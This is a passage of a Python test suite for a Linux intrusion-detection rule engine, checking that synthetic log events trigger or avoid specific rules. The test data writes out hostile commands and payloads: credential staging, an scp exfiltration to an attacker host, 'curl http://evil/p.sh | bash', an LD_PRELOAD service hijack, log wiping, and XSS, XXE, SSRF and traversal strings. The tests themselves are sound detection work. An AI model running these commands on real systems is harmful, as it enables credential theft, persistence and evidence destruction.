    def test_authorized_keys_exec_rule_ignores_ssh_copy_id(self, engine, normalizer):
        raw = (
            'type=EXECVE msg=audit(1234567890.016:306): argc=3 '
            'a0="/usr/bin/ssh-copy-id" a1="alice@server01" a2="/home/alice/.ssh/authorized_keys"'
        )
        evt = normalizer.normalize(raw, "auditd")
        hits = [r.rule_id for r in engine.analyze(evt)]
        assert "AUDIT-CRED-004" not in hits

    def test_gcore_rule_alerts_on_ssh_agent_dump(self, engine, normalizer):
        raw = (
            'type=EXECVE msg=audit(1234567890.017:307): argc=4 '
            'a0="/usr/bin/gcore" a1="-o" a2="/tmp/ssh-agent.core" a3="ssh-agent"'
        )
        evt = normalizer.normalize(raw, "auditd")
        hits = [r.rule_id for r in engine.analyze(evt)]
        assert "AUDIT-CRED-005" in hits

    def test_secret_file_rule_alerts_on_aws_credentials_staging(self, engine, normalizer):
        raw = (
            'type=EXECVE msg=audit(1234567890.018:308): argc=3 '
            'a0="/bin/sh" a1="-c" a2="cat /home/alice/.aws/credentials | base64 > /tmp/aws.b64"'
        )
        evt = normalizer.normalize(raw, "auditd")
        hits = [r.rule_id for r in engine.analyze(evt)]
        assert "AUDIT-CRED-006" in hits

    def test_secret_file_rule_alerts_on_keytab_copy(self, engine, normalizer):
        raw = (
            'type=EXECVE msg=audit(1234567890.019:309): argc=4 '
            'a0="/bin/cp" a1="/etc/krb5.keytab" a2="/tmp/krb5.keytab" a3=""'
        )
        evt = normalizer.normalize(raw, "auditd")
        hits = [r.rule_id for r in engine.analyze(evt)]
        assert "AUDIT-CRED-006" in hits

    def test_process_secret_rule_alerts_on_env_read_from_journald(self, engine):
        evt = NormalizedEvent(
            ts=time.time(),
            source="journald",
            category="process",
            action="process_exec",
            outcome="success",
            process="bash",
            message="cat /srv/app/.env | base64",
            fields={"cmdline": "cat /srv/app/.env | base64"},
        )
        hits = [r.rule_id for r in engine.analyze(evt)]
        assert "PROC-CRED-001" in hits

    def test_process_secret_rule_ignores_kubectl_config_view(self, engine):
        evt = NormalizedEvent(
            ts=time.time(),
            source="journald",
            category="process",
            action="process_exec",
            outcome="success",
            process="kubectl",
            message="kubectl config view --kubeconfig /home/alice/.kube/config",
            fields={"cmdline": "kubectl config view --kubeconfig /home/alice/.kube/config"},
        )
        hits = [r.rule_id for r in engine.analyze(evt)]
        assert "PROC-CRED-001" not in hits


class TestArchiveExfilRules:
    def test_archive_exfil_rules_and_sequence_are_loaded(self, engine):
        ids = {rule["id"] for rule in engine.rule_engine.rules}
        seq_ids = {seq["id"] for seq in engine.sequence.SEQUENCES}
        assert "PROC-EXFIL-001" in ids
        assert "PROC-EXFIL-002" in ids
        assert "SEQ-045" in seq_ids

    def test_archive_then_transfer_alerts_and_completes_sequence(self, engine):
        archive_evt = NormalizedEvent(
            ts=time.time(),
            host="srv-archive-1",
            source="journald",
            category="process",
            action="process_exec",
            outcome="success",
            process="tar",
            message="tar czf /tmp/loot.tgz /etc/ssh /home/alice/.aws/credentials",
            fields={"cmdline": "tar czf /tmp/loot.tgz /etc/ssh /home/alice/.aws/credentials"},
        )
        transfer_evt = NormalizedEvent(
            ts=time.time() + 5,
            host="srv-archive-1",
            source="journald",
            category="process",
            action="process_exec",
            outcome="success",
            process="scp",
            message="scp /tmp/loot.tgz attacker@198.51.100.50:/tmp/loot.tgz",
            fields={"cmdline": "scp /tmp/loot.tgz attacker@198.51.100.50:/tmp/loot.tgz"},
        )

        first_hits = [r.rule_id for r in engine.analyze(archive_evt)]
        second_hits = [r.rule_id for r in engine.analyze(transfer_evt)]

        assert "PROC-EXFIL-001" in first_hits
        assert "PROC-EXFIL-002" in second_hits
        assert "SEQ-045" in second_hits

    def test_benign_backup_archive_does_not_alert(self, engine):
        evt = NormalizedEvent(
            ts=time.time(),
            host="srv-backup-1",
            source="journald",
            category="process",
            action="process_exec",
            outcome="success",
            process="tar",
            message="tar czf /var/backups/etc-nightly.tgz /etc/ssh",
            fields={"cmdline": "tar czf /var/backups/etc-nightly.tgz /etc/ssh"},
        )

        hits = [r.rule_id for r in engine.analyze(evt)]

        assert "PROC-EXFIL-001" not in hits
        assert "PROC-EXFIL-002" not in hits
        assert "SEQ-045" not in hits

    @pytest.mark.parametrize(
        ("host", "cmdline", "distro_family"),
        [
            pytest.param("srv-support-debian", "scp /tmp/apport.openssh-server.tar.gz support@198.51.100.70:/var/support/apport.openssh-server.tar.gz", "debian", id="debian-apport-upload"),
            pytest.param("srv-support-rhel", "scp /tmp/sosreport-node01-20260414.tar.xz support@198.51.100.71:/var/support/sosreport-node01-20260414.tar.xz", "rhel", id="rhel-sosreport-upload"),
            pytest.param("srv-support-suse", "scp /tmp/supportconfig-node01.txz support@198.51.100.72:/var/support/supportconfig-node01.txz", "suse", id="suse-supportconfig-upload"),
        ],
    )
    def test_benign_support_bundle_uploads_do_not_alert(self, engine, host, cmdline, distro_family):
        evt = _proc_evt(time.time(), cmdline, host=host, user="root", process="scp", distro_family=distro_family)

        hits = [r.rule_id for r in engine.analyze(evt)]

        assert "PROC-EXFIL-002" not in hits
        assert "SEQ-045" not in hits


class TestPostLoginDiscoveryAbuseRules:
    def test_post_login_discovery_rule_and_sequence_load(self, engine):
        ids = {rule["id"] for rule in engine.rule_engine.rules}
        seq_ids = {seq["id"] for seq in engine.sequence.SEQUENCES}
        assert "DISC-011" in ids
        assert "SEQ-046" in seq_ids

    def test_login_discovery_then_sudo_sequence_alerts(self, engine, normalizer):
        login_evt = normalizer.normalize(
            "Mar  5 13:10:00 host sshd[2]: Accepted password for alice from 203.0.113.10 port 5555 ssh2",
            "auth.log",
        )
        discovery_evt = NormalizedEvent(
            ts=login_evt.ts + 10,
            host="host",
            source="journald",
            category="process",
            action="process_exec",
            outcome="success",
            user="alice",
            process="bash",
            message="sudo -l && getent group sudo",
            fields={"cmdline": "sudo -l && getent group sudo"},
        )
        sudo_evt = normalizer.normalize(
            "Mar  5 13:11:00 host sudo[3]: alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/ls /root",
            "auth.log",
        )

        first_hits = [r.rule_id for r in engine.analyze(login_evt)]
        second_hits = [r.rule_id for r in engine.analyze(discovery_evt)]
        third_hits = [r.rule_id for r in engine.analyze(sudo_evt)]

        assert "DISC-011" not in first_hits
        assert "DISC-011" in second_hits
        assert "SEQ-046" in third_hits

    def test_benign_interactive_admin_flow_does_not_trigger_sequence(self, engine, normalizer):
        login_evt = normalizer.normalize(
            "Mar  5 13:20:00 host sshd[2]: Accepted publickey for alice from 203.0.113.10 port 5555 ssh2",
            "auth.log",
        )
        benign_evt = NormalizedEvent(
            ts=login_evt.ts + 10,
            host="host",
            source="journald",
            category="process",
            action="process_exec",
            outcome="success",
            user="alice",
            process="bash",
            message="ls /var/log && uptime",
            fields={"cmdline": "ls /var/log && uptime"},
        )
        sudo_evt = normalizer.normalize(
            "Mar  5 13:21:00 host sudo[3]: alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/ls /root",
            "auth.log",
        )

        engine.analyze(login_evt)
        benign_hits = [r.rule_id for r in engine.analyze(benign_evt)]
        sudo_hits = [r.rule_id for r in engine.analyze(sudo_evt)]

        assert "DISC-011" not in benign_hits
        assert "SEQ-046" not in sudo_hits


class TestPersistenceExpansionRules:
    def test_persistence_rule_and_sequences_load(self, engine):
        ids = {rule["id"] for rule in engine.rule_engine.rules}
        seq_ids = {seq["id"] for seq in engine.sequence.SEQUENCES}
        assert "PERS-017" in ids
        assert "PERS-019" in ids
        assert "SEQ-047" in seq_ids
        assert "SEQ-048" in seq_ids
        assert "SEQ-069" in seq_ids

    def test_systemd_timer_persistence_chain_alerts(self, engine):
        create_evt = NormalizedEvent(
            ts=time.time(),
            host="persist-host",
            source="journald",
            category="process",
            action="process_exec",
            outcome="success",
            user="alice",
            process="cp",
            message="cp backup.timer /etc/systemd/system/backup.timer",
            fields={"cmdline": "cp backup.timer /etc/systemd/system/backup.timer"},
        )
        enable_evt = NormalizedEvent(
            ts=create_evt.ts + 5,
            host="persist-host",
            source="journald",
            category="process",
            action="process_exec",
            outcome="success",
            user="alice",
            process="systemctl",
            message="systemctl enable --now backup.timer",
            fields={"cmdline": "systemctl enable --now backup.timer"},
        )

        first_hits = [r.rule_id for r in engine.analyze(create_evt)]
        second_hits = [r.rule_id for r in engine.analyze(enable_evt)]

        assert "PERS-017" in first_hits
        assert "PERS-017" in second_hits
        assert "SEQ-047" in second_hits

    def test_login_then_authorized_keys_drop_alerts(self, engine, normalizer):
        login_evt = normalizer.normalize(
            "Mar  5 13:30:00 host sshd[2]: Accepted password for alice from 203.0.113.10 port 5555 ssh2",
            "auth.log",
        )
        persist_evt = NormalizedEvent(
            ts=login_evt.ts + 10,
            host="host",
            source="journald",
            category="process",
            action="process_exec",
            outcome="success",
            user="alice",
            process="tee",
            message="tee /home/alice/.ssh/authorized_keys",
            fields={"cmdline": "tee /home/alice/.ssh/authorized_keys"},
        )

        engine.analyze(login_evt)
        hits = [r.rule_id for r in engine.analyze(persist_evt)]

        assert "PERS-017" in hits
        assert "SEQ-048" in hits

    def test_benign_service_install_does_not_alert(self, engine):
        evt = NormalizedEvent(
            ts=time.time(),
            host="pkg-host",
            source="journald",
            category="process",
            action="process_exec",
            outcome="success",
            user="root",
            process="apt-get",
            message="apt-get install --yes packagekit && systemctl preset apt-daily.timer",
            fields={"cmdline": "apt-get install --yes packagekit && systemctl preset apt-daily.timer"},
        )

        hits = [r.rule_id for r in engine.analyze(evt)]

        assert "PERS-017" not in hits
        assert "SEQ-047" not in hits
        assert "SEQ-048" not in hits

    def test_systemd_executor_deserialize_does_not_alert_pers_017(self, engine):
        evt = NormalizedEvent(
            ts=time.time(),
            host="executor-host",
            source="journald",
            category="process",
            action="process_exec",
            outcome="success",
            user="root",
            process="systemd-executor",
            message="/usr/lib/systemd/systemd-executor --deserialize 24",
            fields={"cmdline": "/usr/lib/systemd/systemd-executor --deserialize 24"},
        )

        hits = [r.rule_id for r in engine.analyze(evt)]

        assert "PERS-017" not in hits
        assert "SEQ-047" not in hits

    def test_user_systemctl_persistence_still_alerts(self, engine):
        evt = NormalizedEvent(
            ts=time.time(),
            host="user-systemd-host",
            source="journald",
            category="process",
            action="process_exec",
            outcome="success",
            user="alice",
            process="systemctl",
            message="mkdir -p /home/alice/.config/systemd/user && cp updater.service /home/alice/.config/systemd/user/updater.service && systemctl --user enable --now updater.service",
            fields={"cmdline": "mkdir -p /home/alice/.config/systemd/user && cp updater.service /home/alice/.config/systemd/user/updater.service && systemctl --user enable --now updater.service"},
        )

        hits = [r.rule_id for r in engine.analyze(evt)]

        assert "PERS-017" in hits

    def test_service_override_hijack_rule_alerts(self, engine):
        evt = NormalizedEvent(
            ts=time.time(),
            host="svc-hijack-host",
            source="journald",
            category="process",
            action="process_exec",
            outcome="success",
            user="root",
            process="systemctl",
            message="mkdir -p /etc/systemd/system/sshd.service.d && printf '[Service]\\nExecStart=/usr/local/bin/sshd-wrapper\\n' > /etc/systemd/system/sshd.service.d/override.conf && systemctl daemon-reload && systemctl restart sshd",
            fields={"cmdline": "mkdir -p /etc/systemd/system/sshd.service.d && printf '[Service]\\nExecStart=/usr/local/bin/sshd-wrapper\\n' > /etc/systemd/system/sshd.service.d/override.conf && systemctl daemon-reload && systemctl restart sshd"},
        )

        hits = [r.rule_id for r in engine.analyze(evt)]

        assert "PERS-019" in hits

    def test_login_account_abuse_then_service_hijack_sequence_alerts(self, engine):
        login_evt = _auth_evt(time.time(), user="alice", host="svc-seq-01")
        abuse_evt = _proc_evt(
            login_evt.ts + 10,
            "usermod -aG sudo bob",
            host="svc-seq-01",
            user="root",
            process="usermod",
        )
        hijack_evt = _proc_evt(
            abuse_evt.ts + 10,
            "printf '[Service]\\nEnvironment=LD_PRELOAD=/tmp/evil.so\\n' > /etc/systemd/system/cron.service.d/override.conf",
            host="svc-seq-01",
            user="root",
            process="printf",
        )
        execute_evt = _proc_evt(
            hijack_evt.ts + 10,
            "systemctl daemon-reload && systemctl restart cron",
            host="svc-seq-01",
            user="root",
            process="systemctl",
        )

        engine.analyze(login_evt)
        engine.analyze(abuse_evt)
        engine.analyze(hijack_evt)
        hits = [r.rule_id for r in engine.analyze(execute_evt)]

        assert "SEQ-069" in hits

    def test_benign_daemon_reload_and_restart_do_not_alert_service_hijack(self, engine):
        evt = NormalizedEvent(
            ts=time.time(),
            host="svc-benign-host",
            source="journald",
            category="process",
            action="process_exec",
            outcome="success",
            user="root",
            process="apt-get",
            message="apt-get install --yes openssh-server && systemctl daemon-reload && systemctl restart ssh",
            fields={"cmdline": "apt-get install --yes openssh-server && systemctl daemon-reload && systemctl restart ssh"},
        )

        hits = [r.rule_id for r in engine.analyze(evt)]

        assert "PERS-019" not in hits
        assert "SEQ-069" not in hits


class TestDarPersistencePathDistroParity:
    @pytest.mark.parametrize(
        ("distro_family", "cmdline", "process"),
        [
            pytest.param("debian", "install -m 644 override.conf /etc/systemd/system/ssh.service.d/override.conf", "install", id="debian-systemd-override"),
            pytest.param("rhel", "install -m 755 crond-wrapper /etc/rc.d/init.d/crond-wrapper", "install", id="rhel-initd-wrapper"),
            pytest.param("suse", "install -m 755 cron-wrapper /etc/init.d/cron-wrapper", "install", id="suse-initd-wrapper"),
        ],
    )
    def test_positive_persistence_path_rule_covers_supported_distros(self, engine, distro_family, cmdline, process):
        evt = _proc_evt(
            time.time(),
            cmdline,
            host=f"{distro_family}-pers-pos",
            user="root",
            process=process,
            distro_family=distro_family,
        )

        hits = [r.rule_id for r in engine.analyze(evt)]

        assert "PERS-017" in hits

    @pytest.mark.parametrize(
        ("distro_family", "cmdline", "process", "forbidden"),
        [
            pytest.param("debian", "unattended-upgrades && install -m 644 /lib/systemd/system/ssh.service /etc/systemd/system/ssh.service && systemctl preset ssh.service", "unattended-upgrades", {"PERS-017", "SEQ-047"}, id="debian-unattended-upgrades"),
            pytest.param("rhel", "subscription-manager refresh && install -m 644 /usr/lib/systemd/system/sshd.service /etc/systemd/system/sshd.service && systemctl daemon-reload && systemctl restart sshd", "subscription-manager", {"PERS-017", "PERS-019", "SEQ-047", "SEQ-069"}, id="rhel-subscription-maintenance"),
            pytest.param("suse", "transactional-update run install -m 644 /usr/lib/systemd/system/cron.service /etc/systemd/system/cron.service && systemctl daemon-reload && systemctl restart cron", "transactional-update", {"PERS-017", "PERS-019", "SEQ-047", "SEQ-069"}, id="suse-transactional-maintenance"),
        ],
    )
    def test_benign_persistence_admin_flows_are_excluded_per_distro(self, engine, distro_family, cmdline, process, forbidden):
        hits = [r.rule_id for r in engine.analyze(_proc_evt(time.time(), cmdline, host=f"{distro_family}-pers-benign", user="root", process=process, distro_family=distro_family))]

        for rule_id in forbidden:
            assert rule_id not in hits


class TestLogSabotageRules:
    def test_log_sabotage_rule_and_sequences_load(self, engine):
        ids = {rule["id"] for rule in engine.rule_engine.rules}
        seq_ids = {seq["id"] for seq in engine.sequence.SEQUENCES}
        assert "DE-017" in ids
        assert "SEQ-049" in seq_ids
        assert "SEQ-050" in seq_ids

    def test_auditd_stop_then_log_clean_sequence_alerts(self, engine):
        stop_evt = NormalizedEvent(
            ts=time.time(),
            host="tamper-host",
            source="journald",
            category="process",
            action="process_exec",
            outcome="success",
            user="root",
            process="systemctl",
            message="systemctl stop auditd && systemctl mask rsyslog",
            fields={"cmdline": "systemctl stop auditd && systemctl mask rsyslog"},
        )
        clear_evt = NormalizedEvent(
            ts=stop_evt.ts + 5,
            host="tamper-host",
            source="journald",
            category="process",
            action="process_exec",
            outcome="success",
            user="root",
            process="truncate",
            message="truncate -s 0 /var/log/auth.log && journalctl --vacuum-time=1s",
            fields={"cmdline": "truncate -s 0 /var/log/auth.log && journalctl --vacuum-time=1s"},
        )

        first_hits = [r.rule_id for r in engine.analyze(stop_evt)]
        second_hits = [r.rule_id for r in engine.analyze(clear_evt)]

        assert "DE-017" in first_hits
        assert "DE-017" in second_hits
        assert "SEQ-049" in second_hits

    def test_benign_logrotate_maintenance_does_not_alert(self, engine):
        evt = NormalizedEvent(
            ts=time.time(),
            host="maint-host",
            source="journald",
            category="process",
            action="process_exec",
            outcome="success",
            user="root",
            process="logrotate",
            message="logrotate -f /etc/logrotate.conf && systemctl restart rsyslog",
            fields={"cmdline": "logrotate -f /etc/logrotate.conf && systemctl restart rsyslog"},
        )

        hits = [r.rule_id for r in engine.analyze(evt)]

        assert "DE-017" not in hits
        assert "SEQ-049" not in hits
        assert "SEQ-050" not in hits


class TestDarLogTamperDistroParity:
    @pytest.mark.parametrize(
        ("distro_family", "cmdline", "process"),
        [
            pytest.param("debian", "truncate -s 0 /var/log/auth.log", "truncate", id="debian-authlog-truncate"),
            pytest.param("rhel", "shred /var/log/secure", "shred", id="rhel-secure-shred"),
            pytest.param("suse", "shred /var/log/messages && journalctl --vacuum-files=1", "shred", id="suse-messages-purge"),
        ],
    )
    def test_positive_log_tamper_rule_covers_supported_distros(self, engine, distro_family, cmdline, process):
        hits = [r.rule_id for r in engine.analyze(_proc_evt(time.time(), cmdline, host=f"{distro_family}-tamper-pos", user="root", process=process, distro_family=distro_family))]

        assert "DE-017" in hits

    @pytest.mark.parametrize(
        ("distro_family", "cmdline", "process"),
        [
            pytest.param("debian", "needrestart && journalctl --rotate && systemctl restart systemd-journald", "needrestart", id="debian-needrestart-maintenance"),
            pytest.param("rhel", "subscription-manager refresh && journalctl --rotate && systemctl restart rsyslog", "subscription-manager", id="rhel-subscription-maintenance"),
            pytest.param("suse", "transactional-update run journalctl --rotate && systemctl restart systemd-journald", "transactional-update", id="suse-transactional-maintenance"),
        ],
    )
    def test_benign_log_tamper_admin_flows_are_excluded_per_distro(self, engine, distro_family, cmdline, process):
        hits = [r.rule_id for r in engine.analyze(_proc_evt(time.time(), cmdline, host=f"{distro_family}-tamper-benign", user="root", process=process, distro_family=distro_family))]

        assert "DE-017" not in hits
        assert "SEQ-049" not in hits
        assert "SEQ-050" not in hits


class TestWebPackRules:
    def test_web_post_exploit_rule_and_sequence_load(self, engine):
        ids = {rule["id"] for rule in engine.rule_engine.rules}
        seq_ids = {seq["id"] for seq in engine.sequence.SEQUENCES}
        assert "WEB-017" in ids
        assert "SEQ-052" in seq_ids

    def test_xss_rule_alerts_on_decoded_path(self, engine, normalizer):
        raw = '203.0.113.10 - - [05/Mar/2026:12:10:00 +0300] "GET /search?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1" 200 123 "-" "Mozilla/5.0"'
        evt = normalizer.normalize(raw, "apache2")
        hits = [r.rule_id for r in engine.analyze(evt)]
        assert "WEB-014" in hits

    def test_ssti_rule_alerts_on_template_payload(self, engine, normalizer):
        raw = '203.0.113.11 - - [05/Mar/2026:12:11:00 +0300] "GET /?name=%7B%7B7*7%7D%7D HTTP/1.1" 200 123 "-" "Mozilla/5.0"'
        evt = normalizer.normalize(raw, "nginx")
        hits = [r.rule_id for r in engine.analyze(evt)]
        assert "WEB-006" in hits

    def test_command_injection_rule_alerts_on_decoded_path(self, engine, normalizer):
        raw = '203.0.113.12 - - [05/Mar/2026:12:12:00 +0300] "GET /cgi-bin/test?cmd=%60id%60 HTTP/1.1" 500 123 "-" "Mozilla/5.0"'
        evt = normalizer.normalize(raw, "apache2")
        hits = [r.rule_id for r in engine.analyze(evt)]
        assert "WEB-007" in hits

    def test_command_injection_rule_ignores_benign_cmd_parameter(self, engine, normalizer):
        raw = '203.0.113.12 - - [05/Mar/2026:12:12:30 +0300] "GET /cgi-bin/test?cmd=list HTTP/1.1" 200 123 "-" "Mozilla/5.0"'
        evt = normalizer.normalize(raw, "apache2")
        hits = [r.rule_id for r in engine.analyze(evt)]
        assert "WEB-007" not in hits

    def test_dangerous_upload_rule_alerts_on_polyglot_path(self, engine, normalizer):
        raw = '203.0.113.13 - - [05/Mar/2026:12:13:00 +0300] "POST /upload/avatar.php.jpg HTTP/1.1" 200 123 "-" "Mozilla/5.0"'
        evt = normalizer.normalize(raw, "nginx")
        hits = [r.rule_id for r in engine.analyze(evt)]
        assert "WEB-008" in hits

    def test_dangerous_upload_rule_ignores_blocked_direct_php_fetch(self, engine, normalizer):
        raw = '203.0.113.13 - - [05/Mar/2026:12:13:20 +0300] "GET /uploads/shell.php HTTP/1.1" 403 123 "-" "Mozilla/5.0"'
        evt = normalizer.normalize(raw, "nginx")
        hits = [r.rule_id for r in engine.analyze(evt)]
        assert "WEB-008" not in hits

    def test_slowhttptest_rule_alerts_on_user_agent(self, engine, normalizer):
        raw = '203.0.113.14 - - [05/Mar/2026:12:14:00 +0300] "GET / HTTP/1.1" 200 123 "-" "slowhttptest/1.0"'
        evt = normalizer.normalize(raw, "apache2")
        hits = [r.rule_id for r in engine.analyze(evt)]
        assert "WEB-010" in hits

    def test_ssrf_rule_alerts_on_metadata_endpoint(self, engine, normalizer):
        raw = '203.0.113.15 - - [05/Mar/2026:12:15:00 +0300] "GET /fetch?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1" 200 123 "-" "Mozilla/5.0"'
        evt = normalizer.normalize(raw, "nginx")
        hits = [r.rule_id for r in engine.analyze(evt)]
        assert "WEB-011" in hits
        assert "WEB-015" not in hits

    def test_ssrf_rule_does_not_alert_on_normal_external_url(self, engine, normalizer):
        raw = '203.0.113.15 - - [05/Mar/2026:12:15:30 +0300] "GET /fetch?url=http://example.com/index.html HTTP/1.1" 200 123 "-" "Mozilla/5.0"'
        evt = normalizer.normalize(raw, "nginx")
        hits = [r.rule_id for r in engine.analyze(evt)]
        assert "WEB-011" not in hits

    def test_ssrf_rule_ignores_internal_text_without_fetch_parameter(self, engine, normalizer):
        raw = '203.0.113.15 - - [05/Mar/2026:12:15:45 +0300] "GET /docs/169.254.169.254-notes HTTP/1.1" 200 123 "-" "Mozilla/5.0"'
        evt = normalizer.normalize(raw, "nginx")
        hits = [r.rule_id for r in engine.analyze(evt)]
        assert "WEB-011" not in hits

    def test_xxe_rule_alerts_on_decoded_entity_payload(self, engine, normalizer):
        raw = '203.0.113.16 - - [05/Mar/2026:12:16:00 +0300] "GET /api?xml=%3C!ENTITY%20xxe%20SYSTEM%20%22http://evil.test/xxe.dtd%22%3E HTTP/1.1" 400 123 "-" "Mozilla/5.0"'
        evt = normalizer.normalize(raw, "apache2")
        hits = [r.rule_id for r in engine.analyze(evt)]
        assert "WEB-015" in hits
        assert "WEB-011" not in hits

    def test_path_traversal_rule_alerts_on_double_encoded_probe(self, engine, normalizer):
        raw = '203.0.113.17 - - [05/Mar/2026:12:17:00 +0300] "GET /download/%252e%252e/%252e%252e/etc/passwd HTTP/1.1" 403 0 "-" "curl/8.0"'
        evt = normalizer.normalize(raw, "apache2")
        hits = [r.rule_id for r in engine.analyze(evt)]
        assert "WEB-016" in hits

    def test_suspicious_http_method_rule_alerts_on_trace_request(self, engine, normalizer):
        raw = '203.0.113.18 - - [05/Mar/2026:12:18:00 +0300] "TRACE / HTTP/1.1" 405 0 "-" "curl/8.0"'
        evt = normalizer.normalize(raw, "apache2")
        hits = [r.rule_id for r in engine.analyze(evt)]
        assert "WEB-019" in hits

    def test_suspicious_http_method_rule_alerts_on_options_server_status_probe(self, engine, normalizer):
        raw = '203.0.113.19 - - [05/Mar/2026:12:19:00 +0300] "OPTIONS /server-status?auto HTTP/1.1" 403 0 "-" "curl/8.0"'
        evt = normalizer.normalize(raw, "apache2")
        hits = [r.rule_id for r in engine.analyze(evt)]
        assert "WEB-019" in hits

    def test_suspicious_http_method_rule_ignores_benign_options_health_probe(self, engine, normalizer):
        raw = '203.0.113.19 - - [05/Mar/2026:12:19:30 +0300] "OPTIONS /healthz HTTP/1.1" 200 2 "-" "kube-probe/1.31"'
        evt = normalizer.normalize(raw, "apache2")
        hits = [r.rule_id for r in engine.analyze(evt)]
        assert "WEB-019" not in hits

    def test_sensitive_file_probe_rule_alerts_on_env_fetch_and_keeps_404_scan(self, engine, normalizer):
        raw = '203.0.113.20 - - [05/Mar/2026:12:20:00 +0300] "GET /.env HTTP/1.1" 404 0 "-" "curl/8.0"'
        evt = normalizer.normalize(raw, "nginx")
        hits = [r.rule_id for r in engine.analyze(evt)]
        assert "WEB-020" in hits
        assert "WEB-005" in hits

    def test_web005_uses_same_source_path_class_cooldown_entity(self, engine):
        rule = next(rule for rule in engine.rule_engine.rules if rule.get("id") == "WEB-005")
        assert rule.get("cooldown") == 180
        assert rule.get("cooldown_entity") == "web_source_path_class"

    def test_sensitive_file_probe_rule_ignores_benign_prometheus_server_status(self, engine, normalizer):
        raw = '203.0.113.21 - - [05/Mar/2026:12:21:00 +0300] "GET /server-status?auto HTTP/1.1" 200 128 "-" "Prometheus/2.52"'
        evt = normalizer.normalize(raw, "apache2")
        hits = [r.rule_id for r in engine.analyze(evt)]
        assert "WEB-020" not in hits

    def test_db_port_probe_rule_alerts_on_blocked_postgres_probe_and_keeps_fw_001(self, engine, normalizer):
        raw = (
            "Mar  5 12:22:00 myhost kernel: [UFW BLOCK] IN=eth0 OUT= "
            "SRC=192.168.1.182 DST=192.168.1.162 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12345 "
            "PROTO=TCP SPT=54321 DPT=5432 WINDOW=65535"
        )
        evt = normalizer.normalize(raw, "ufw")
        hits = [r.rule_id for r in engine.analyze(evt)]
        assert "FW-001" in hits
        assert "NET-DB-001" in hits

    def test_db_port_probe_rule_ignores_non_database_firewall_port(self, engine, normalizer):
        raw = (
            "Mar  5 12:22:30 myhost kernel: [UFW BLOCK] IN=eth0 OUT= "
            "SRC=192.168.1.182 DST=192.168.1.162 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12346 "
            "PROTO=TCP SPT=54322 DPT=22 WINDOW=65535"
        )
        evt = normalizer.normalize(raw, "ufw")
        hits = [r.rule_id for r in engine.analyze(evt)]
        assert "FW-001" in hits
        assert "NET-DB-001" not in hits

    def test_path_traversal_rule_ignores_404_noise(self, engine, normalizer):
        raw = '203.0.113.17 - - [05/Mar/2026:12:17:30 +0300] "GET /download/%252e%252e/%252e%252e/etc/passwd HTTP/1.1" 404 0 "-" "curl/8.0"'
        evt = normalizer.normalize(raw, "apache2")
        hits = [r.rule_id for r in engine.analyze(evt)]
        assert "WEB-016" not in hits

    def test_web_exploit_then_process_abuse_sequence_alerts(self, engine):
        web_evt = NormalizedEvent(
            ts=time.time(),
            host="web01",
            src_ip="203.0.113.30",
            source="nginx",
            category="web_attack",
            action="shell_upload",
            outcome="success",
            message="POST /upload/avatar.php.jpg -> 200",
            fields={
                "attack": "shell_upload",
                "method": "POST",
                "path": "/upload/avatar.php.jpg",
                "path_lc": "/upload/avatar.php.jpg",
                "path_decoded": "/upload/avatar.php.jpg",
                "path_decoded_lc": "/upload/avatar.php.jpg",
                "status": 200,
                "ua": "Mozilla/5.0",
                "ua_lc": "mozilla/5.0",
            },
        )
        proc_evt = NormalizedEvent(
            ts=web_evt.ts + 15,
            host="web01",
            source="journald",
            category="process",
            action="process_exec",
            outcome="success",
            user="www-data",
            process="bash",
            message="curl http://evil/p.sh | bash",
            fields={"cmdline": "curl http://evil/p.sh | bash"},
        )

        first_hits = [r.rule_id for r in engine.analyze(web_evt)]
        second_hits = [r.rule_id for r in engine.analyze(proc_evt)]

        assert "WEB-017" in first_hits
        assert "SEQ-052" in second_hits

    def test_benign_upload_admin_flow_does_not_alert_web_post_exploit_chain(self, engine):
        web_evt = NormalizedEvent(
            ts=time.time(),
            host="web01",
            src_ip="203.0.113.31",
            source="nginx",
            category="network",
            action="http_request",
            outcome="success",
            message="POST /admin/upload/avatar.png -> 200",
            fields={
                "method": "POST",
                "path": "/admin/upload/avatar.png",
                "path_lc": "/admin/upload/avatar.png",
                "path_decoded": "/admin/upload/avatar.png",
                "path_decoded_lc": "/admin/upload/avatar.png",
                "status": 200,
                "ua": "Mozilla/5.0",
                "ua_lc": "mozilla/5.0",
            },
        )
        proc_evt = NormalizedEvent(
            ts=web_evt.ts + 10,
            host="web01",
            source="journald",
            category="process",
            action="process_exec",
            outcome="success",
            user="www-data",
            process="curl",
            message="curl -fsS http://127.0.0.1/health",
            fields={"cmdline": "curl -fsS http://127.0.0.1/health"},
        )

        first_hits = [r.rule_id for r in engine.analyze(web_evt)]
        second_hits = [r.rule_id for r in engine.analyze(proc_evt)]

        assert "WEB-017" not in first_hits
        assert "SEQ-052" not in second_hits


class TestContainerAbuseRules:
    def test_container_abuse_rule_and_sequence_load(self, engine):
        ids = {rule["id"] for rule in engine.rule_engine.rules}
        seq_ids = {seq["id"] for seq in engine.sequence.SEQUENCES}
        assert "PROC-CONT-001" in ids
        assert "SEQ-053" in seq_ids

    def test_container_exec_then_host_abuse_sequence_alerts(self, engine):
        exec_evt = NormalizedEvent(
            ts=time.time(),
            host="node01",
            source="journald",
            category="process",
            action="process_exec",
            outcome="success",
            user="root",
            process="docker",
            message="docker exec -it webapp sh",
            fields={"cmdline": "docker exec -it webapp sh"},
        )
        abuse_evt = NormalizedEvent(
            ts=exec_evt.ts + 20,
            host="node01",
            source="journald",
            category="process",
            action="process_exec",
            outcome="success",
            user="root",
            process="tar",
            message="tar czf /tmp/host.tgz /host/etc /host/root/.ssh",
            fields={"cmdline": "tar czf /tmp/host.tgz /host/etc /host/root/.ssh"},
        )

        first_hits = [r.rule_id for r in engine.analyze(exec_evt)]
        second_hits = [r.rule_id for r in engine.analyze(abuse_evt)]

        assert "PROC-CONT-001" in first_hits
        assert "SEQ-053" in second_hits

    def test_benign_container_admin_flow_does_not_alert_container_abuse_chain(self, engine):
        exec_evt = NormalizedEvent(
            ts=time.time(),
            host="node01",
            source="journald",
            category="process",
            action="process_exec",
            outcome="success",
            user="root",
            process="kubectl",
            message="kubectl exec -n kube-system metrics-server -- /bin/true",
